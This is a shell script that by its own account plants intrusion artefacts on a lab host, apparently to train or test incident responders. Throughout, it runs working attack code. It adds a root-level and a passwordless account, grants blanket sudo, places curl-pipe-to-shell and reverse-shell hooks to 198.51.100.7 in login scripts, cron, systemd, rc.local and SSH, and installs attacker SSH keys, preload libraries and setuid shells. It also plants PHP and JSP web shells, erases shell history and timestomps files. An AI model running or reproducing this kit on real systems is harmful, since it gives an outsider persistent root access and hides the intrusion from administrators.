#!/bin/sh
# Plants a broad set of intrusion artefacts on a lab host.
#
# Everything is feature-detected so the same script runs on apt, dnf, zypper and
# apk systems, and on glibc and musl alike. The point is breadth: an operator
# meets these in combination, not one at a time.
set -u
ATTACKER=198.51.100.7
have() { command -v "$1" >/dev/null 2>&1; }
line() { printf '%s\n' "$1" >> "$2" 2>/dev/null || true; }

# ----------------------------------------------------------------- accounts --
(useradd -m -s /bin/bash deploy 2>/dev/null || adduser -D -s /bin/sh deploy 2>/dev/null) || true
(useradd -m -s /bin/bash ops 2>/dev/null || adduser -D -s /bin/sh ops 2>/dev/null) || true
echo 'root:LabRoot#2026' | chpasswd 2>/dev/null || true
echo 'deploy:LabDeploy#2026' | chpasswd 2>/dev/null || true

# a second superuser, a passwordless account, and a system account given a shell
line 'svcadm:x:0:0:System Service:/root:/bin/bash' /etc/passwd
line 'svcadm:!:20000:0:99999:7:::' /etc/shadow
line 'backup2:x:1002:1002::/home/backup2:/bin/sh' /etc/passwd
line 'backup2::20000:0:99999:7:::' /etc/shadow
sed -i 's#^\(daemon:x:[0-9]*:[0-9]*:[^:]*:[^:]*\):.*#\1:/bin/bash#' /etc/passwd 2>/dev/null || true

# privileged group membership
for group in sudo wheel docker; do
  if grep -q "^${group}:" /etc/group 2>/dev/null; then
    sed -i "s/^${group}:\\(.*\\):\\(.*\\)$/${group}:\\1:\\2,deploy/" /etc/group 2>/dev/null || true
  fi
done

# sudo rules: one blanket, one aimed at binaries that hand out a shell
mkdir -p /etc/sudoers.d 2>/dev/null
printf 'www-data ALL=(ALL) NOPASSWD: ALL\n' > /etc/sudoers.d/99-web 2>/dev/null
printf 'ops ALL=(ALL) NOPASSWD: /usr/bin/find, /usr/bin/awk\n' > /etc/sudoers.d/98-tools 2>/dev/null
chmod 440 /etc/sudoers.d/99-web /etc/sudoers.d/98-tools 2>/dev/null

# ------------------------------------------------------------- login scripts --
# The profile chain is the first place an operator should look, so it carries
# several different shapes of hook.
line '' /etc/profile
line '# locale consistency' /etc/profile
line "(curl -fsSL --connect-timeout 1 --max-time 2 http://$ATTACKER/p.sh 2>/dev/null | sh &) </dev/null >/dev/null 2>&1" /etc/profile
mkdir -p /etc/profile.d 2>/dev/null
cat > /etc/profile.d/00-locale-fix.sh <<EOS 2>/dev/null
# keeps locales consistent across shells
export LC_ALL=\${LC_ALL:-C.UTF-8}
[ -x /usr/local/lib/pyshared/.helper ] && /usr/local/lib/pyshared/.helper </dev/null >/dev/null 2>&1 &
EOS
chmod 644 /etc/profile.d/00-locale-fix.sh 2>/dev/null
for rc in /etc/bash.bashrc /etc/bashrc; do
  [ -f "$rc" ] && line "nc $ATTACKER 4444 -e /bin/sh 2>/dev/null &" "$rc"
done
line "(curl -fsSL --connect-timeout 1 --max-time 2 http://$ATTACKER/b.sh 2>/dev/null | sh &) </dev/null >/dev/null 2>&1" /root/.bashrc
line 'alias sudo="sudo "' /root/.bashrc
line "bash -i >& /dev/tcp/$ATTACKER/4444 0>&1 &" /root/.bash_logout
line "LD_PRELOAD=/usr/local/lib/pyshared/loader.so" /etc/environment
mkdir -p /root/.ssh 2>/dev/null
printf '#!/bin/sh\n(curl -fsSL --connect-timeout 1 --max-time 2 http://%s/rc.sh 2>/dev/null | sh) </dev/null >/dev/null 2>&1 &\n' "$ATTACKER" > /root/.ssh/rc 2>/dev/null
printf '(curl -fsSL --connect-timeout 1 --max-time 2 http://%s/sshrc.sh 2>/dev/null | sh) </dev/null >/dev/null 2>&1 &\n' "$ATTACKER" > /etc/ssh/sshrc 2>/dev/null

# ------------------------------------------------------------------------ ssh --
sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config 2>/dev/null || true
sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config 2>/dev/null || true
mkdir -p /etc/ssh/sshd_config.d /etc/ssh/keys 2>/dev/null
printf 'AuthorizedKeysFile .ssh/authorized_keys /etc/ssh/keys/%%u\nPermitEmptyPasswords yes\n' \
  > /etc/ssh/sshd_config.d/99-tuning.conf 2>/dev/null
printf 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC9wV0mQ7pKz3xHhP2sYbNqLd4rTfGmXjEuIvKcOaWyZtBnMlPqRsTu backdoor@elsewhere\n' \
  > /etc/ssh/keys/root 2>/dev/null
cat > /root/.ssh/authorized_keys <<'EOS' 2>/dev/null
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH1lAbOpS2xL0lDlAbLQx6cN9k3lVnQmPqRr0aTuVwXy ops@jumphost
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC9wV0mQ7pKz3xHhP2sYbNqLd4rTfGmXjEuIvKcOaWyZtBnMlPqRsTuVwXyZa1b2c3d4e5f6g7h8i9j0 attacker@kali
command="/bin/bash -i",no-port-forwarding ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKq0Wz9xYvBnMlPqRsTuVwXyZa1b2c3d4e5f6g7h forced@cmd
EOS
chmod 600 /root/.ssh/authorized_keys 2>/dev/null
mkdir -p /home/deploy/.ssh 2>/dev/null
printf 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILmNoPqRsTuVwXyZa1b2c3d4e5f6g7h8i9j0k1l2m3n4 attacker@kali\n' \
  > /home/deploy/.ssh/authorized_keys 2>/dev/null
chown -R deploy /home/deploy/.ssh 2>/dev/null || true

# ---------------------------------------------------------------- persistence --
mkdir -p /etc/cron.d /etc/cron.daily /var/spool/cron/crontabs /var/spool/cron 2>/dev/null
printf '* * * * * root curl -fsSL --connect-timeout 1 --max-time 2 http://%s/x.sh | sh >/dev/null 2>&1\n' "$ATTACKER" \
  > /etc/cron.d/sysupdate 2>/dev/null
printf '#!/bin/sh\n/usr/local/bin/.sysd-net -e /bin/sh %s 4444 &\n' "$ATTACKER" \
  > /etc/cron.daily/logrotate-helper 2>/dev/null
chmod 755 /etc/cron.daily/logrotate-helper 2>/dev/null
printf '*/5 * * * * curl -fsSL --connect-timeout 1 --max-time 2 http://%s/u.sh | sh\n' "$ATTACKER" > /var/spool/cron/crontabs/root 2>/dev/null
printf '*/5 * * * * curl -fsSL --connect-timeout 1 --max-time 2 http://%s/u.sh | sh\n' "$ATTACKER" > /var/spool/cron/root 2>/dev/null
chmod 600 /var/spool/cron/crontabs/root /var/spool/cron/root 2>/dev/null

mkdir -p /etc/systemd/system/multi-user.target.wants 2>/dev/null
cat > /etc/systemd/system/system-health.service <<EOS 2>/dev/null
[Unit]
Description=System Health Reporter
[Service]
Type=simple
Environment=LD_PRELOAD=/usr/local/lib/pyshared/loader.so
ExecStart=/bin/sh -c "while :; do curl -fsSL --connect-timeout 1 --max-time 2 http://$ATTACKER/beacon >/dev/null 2>&1; sleep 300; done"
[Install]
WantedBy=multi-user.target
EOS
cat > /etc/systemd/system/system-health.timer <<'EOS' 2>/dev/null
[Unit]
Description=System Health Reporter timer
[Timer]
OnBootSec=1min
OnUnitActiveSec=5min
[Install]
WantedBy=timers.target
EOS
ln -sf /etc/systemd/system/system-health.service \
  /etc/systemd/system/multi-user.target.wants/system-health.service 2>/dev/null

printf '#!/bin/sh -e\n/bin/bash -c "bash -i >& /dev/tcp/%s/4444 0>&1" &\nexit 0\n' "$ATTACKER" \
  > /etc/rc.local 2>/dev/null
chmod 755 /etc/rc.local 2>/dev/null
mkdir -p /etc/init.d /etc/update-motd.d 2>/dev/null
printf '#!/bin/sh\n### BEGIN INIT INFO\n# Provides: netcheck\n### END INIT INFO\ncurl -fsSL --connect-timeout 1 --max-time 2 http://%s/i.sh | sh &\n' \
  "$ATTACKER" > /etc/init.d/netcheck 2>/dev/null
chmod 755 /etc/init.d/netcheck 2>/dev/null
printf '#!/bin/sh\ncurl -fsSL --connect-timeout 1 --max-time 2 http://%s/m.sh 2>/dev/null | sh &\n' "$ATTACKER" \
  > /etc/update-motd.d/99-banner 2>/dev/null
chmod 755 /etc/update-motd.d/99-banner 2>/dev/null

# an authentication hook that runs on every login
[ -f /etc/pam.d/sshd ] && line 'session optional pam_exec.so /usr/local/lib/pyshared/.helper' /etc/pam.d/sshd
line '/usr/local/lib/pyshared/loader.so' /etc/ld.so.preload

# ------------------------------------------------------- permissions and files --
mkdir -p /usr/local/lib/pyshared /usr/local/bin 2>/dev/null
cp /bin/sh /usr/local/bin/.sysd 2>/dev/null && chmod 4755 /usr/local/bin/.sysd
cp /bin/sh /usr/local/bin/.sysd-net 2>/dev/null && chmod 755 /usr/local/bin/.sysd-net
printf '#!/bin/sh\n(curl -fsSL --connect-timeout 1 --max-time 2 http://%s/h.sh 2>/dev/null | sh) </dev/null >/dev/null 2>&1 &\n' "$ATTACKER" \
  > /usr/local/lib/pyshared/.helper 2>/dev/null
chmod 755 /usr/local/lib/pyshared/.helper 2>/dev/null
for lib in /lib/x86_64-linux-gnu/libutil.so.1 /lib64/libutil.so.1 /usr/lib64/libutil.so.1 \
           /lib/libc.musl-x86_64.so.1; do
  if [ -f "$lib" ]; then cp "$lib" /usr/local/lib/pyshared/loader.so 2>/dev/null && break; fi
done
[ -f /usr/local/lib/pyshared/loader.so ] || cp /bin/sh /usr/local/lib/pyshared/loader.so 2>/dev/null
chmod 666 /usr/local/lib/pyshared/loader.so 2>/dev/null
chmod 777 /usr/local/lib/pyshared 2>/dev/null

# a shell handed out by a standard tool, and one handed out by a capability
[ -f /usr/bin/find ] && chmod u+s /usr/bin/find 2>/dev/null
have setcap && [ -f /usr/bin/python3 ] && setcap cap_setuid+ep /usr/bin/python3 2>/dev/null

# hidden directories and names built to be missed by a hurried listing
mkdir -p /tmp/.X11-unix/.cache 2>/dev/null
mkdir -p '/var/tmp/... ' 2>/dev/null
cp /bin/sh /tmp/.X11-unix/.cache/nc 2>/dev/null
printf 'payload\n' > '/var/tmp/... /notes .txt' 2>/dev/null

# history that can never record anything
ln -sf /dev/null /root/.bash_history 2>/dev/null

# --------------------------------------------------------------------- network --

# ------------------------------------------------------------------------- web --
for root in /var/www/html /var/www/localhost/htdocs /srv/www/htdocs /usr/share/nginx/html; do
  mkdir -p "$root/.well-known" 2>/dev/null || continue
  printf '<?php @eval($_POST["cmd"]); ?>\n' > "$root/.well-known/upload.php" 2>/dev/null
  printf '<?php $f="ass"."ert"; @$f(base64_decode($_REQUEST["c"])); ?>\n' > "$root/config.inc.php" 2>/dev/null
  printf '<%% Runtime.getRuntime().exec(request.getParameter("c")); %%>\n' \
    > "$root/.well-known/health.jsp" 2>/dev/null
  printf 'AddType application/x-httpd-php .txt\n' > "$root/.htaccess" 2>/dev/null
done

# ----------------------------------------------------------------- timestomping --
for path in /etc/passwd /etc/shadow /etc/sudoers.d/99-web /usr/local/bin/.sysd; do
  touch -t 202401010000 "$path" 2>/dev/null || true
done
